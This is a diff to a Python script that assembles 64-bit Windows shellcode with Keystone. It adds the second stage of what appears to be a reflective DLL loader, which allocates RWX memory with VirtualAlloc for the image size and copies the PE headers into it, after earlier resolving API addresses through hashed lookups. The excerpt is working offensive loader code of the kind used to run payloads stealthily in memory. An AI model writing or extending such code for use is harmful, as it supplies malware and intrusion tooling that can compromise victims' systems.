@@ -124,6 +124,33 @@ CODE = (
     "   mov ecx, 0x534c0ab8             ;"
     "   call qword ptr [rbp+0x08]       ;"  # Call find_function
     "   mov [rbp+0x48], rax             ;"  # Save NtFlushInstructionCache address for later usage
+    #STEP 2 : load our image into a new permanent location in memory...
+    "   mov ebx, [r12 + 0x3c]           ;"  # Get and add offset to NT Header (e_lfanew)
+    "   add ebx, 0x18                   ;"  # Add offset to Optional header
+    "   add rbx, r12                    ;"  # VA of the Optional Header for the PE to be loaded
+    "   mov rdi, rbx                    ;"  # RDI = Optional Header value
+    "call_virtual_alloc:                 "
+    "   mov rcx, 0                      ;"  # RCX = NULL (first argument)
+    "   xor rdx, rdx                    ;"  # Clear rdx
+    "   mov edx, [rdi + 0x38]           ;"  # RDX = ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfImage (second argument)
+    "   mov r8d, 0x1000                 ;"  # R8D = MEM_RESERVE
+    "   or r8d, 0x2000                  ;"  # R8D |= MEM_COMMIT (third argument)
+    "   mov r9d, 0x40                   ;"  # R9D = PAGE_EXECUTE_READWRITE (fourth argument)
+    "   call qword ptr [rbp+0x40]       ;"  # Call VirtualAlloc
+    "   mov ecx, [rdi + 0x3c]           ;"  # ECX = ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfHeaders
+    "   mov rdi, rax                    ;"  # RDI = BaseAddress of allocated memory
+    "   mov r13, rax                    ;"  # R13 = Preserve baseaddress of allocated memory
+    "   mov rsi, r12                    ;"  # Move DLL base address to RSI
+    "copy_headers:                       "    
+    "   test ecx, ecx                   ;"  # Check if ECX is 0
+    "   jz done_copy                    ;"  # If zero, exit loop
+    "   mov al, [rsi]                   ;"  # Load byte from [RSI] (uiLibraryAddress)
+    "   mov [rdi], al                   ;"  # Store byte to [RDI] (uiBaseAddress)
+    "   inc rsi                         ;"  # Increment source pointer
+    "   inc rdi                         ;"  # Increment destination pointer
+    "   dec ecx                         ;"  # Decrement counter (uiValueA)
+    "   jmp copy_headers                ;"  # Repeat loop
+    "done_copy:                          "
  )
 
 ks = Ks(KS_ARCH_X86, KS_MODE_64)
